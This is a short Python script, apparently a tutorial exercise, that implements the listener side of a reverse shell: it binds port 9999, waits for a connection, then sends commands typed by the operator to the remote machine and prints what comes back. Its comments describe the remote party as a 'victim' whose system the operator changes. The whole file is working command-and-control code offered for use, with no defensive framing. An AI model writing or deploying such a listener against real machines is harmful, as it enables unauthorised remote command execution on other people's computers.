import socket
import sys

# function for socket(to connect 2 computer)
def create_socket():
    try:
        global host
        global port
        global s
        host =" "
        port = 9999
        s= socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port : " + str(port))

        s.bind((host, port))
        s.listen(5)

        # 5 is the number of connections it can tolerate after which error will occur.
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()   #for retrying


# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend to change something in their system
def send_commands(conn):
    while True:
        # commands are saved in cmd prmpt of a friend/victim
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()




